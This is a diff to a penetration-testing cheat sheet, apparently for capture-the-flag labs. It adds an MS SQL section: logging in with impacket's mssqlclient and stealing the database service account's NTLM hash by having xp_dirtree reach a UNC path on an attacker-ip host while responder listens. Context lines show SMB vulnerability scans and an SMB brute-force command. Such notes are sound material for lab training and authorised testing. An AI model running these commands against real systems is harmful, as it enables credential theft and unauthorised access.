@@ -50,6 +50,7 @@
 ### Windows
 - [Basic enumeration](#basic-enumeration-on-linux-and-windows)
 - [SMB enumeration](#windows-smb-enumeration)
+- [MS SQL](#ms-sql)
 - [xfreerdp](#xfreerdp)
 
 ### Linux Privesc
@@ -715,6 +716,22 @@ nmap -p 445 --script smb-vuln-ms10-054 target-IP
 nmap -p 445 --script smb-vuln-ms10-061 target-IP
 nmap -p 445 --script smb-vuln-ms17-010 target-IP
 ```
+## MS SQL
+* Connect with the db with mssqlclient - github [link](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py)
+```
+python3 mssqlclient.py -windows-auth user@10.10.10.125
+```
+
+* dump mssql user hash with `responder`
+
+`target`
+```
+SQL> xp_dirtree "\\<attacker-ip>\anything\"
+```
+`attacker`
+```
+root@kali:~# responder -I tun0
+```
 
 ## xfreerdp
 * login with the user hash
@@ -989,7 +1006,6 @@ map - Brute Force Accounts (be aware of account lockout!)
 ```
 nmap –p 445 --script smb-brute –script-args userdb=user-list.txt,passdb=pass-list.txt target-IP
 ```
-
 -------------------------------------------------------------------------------------------------------
 # lxc/lxd Privilege Escalation
 
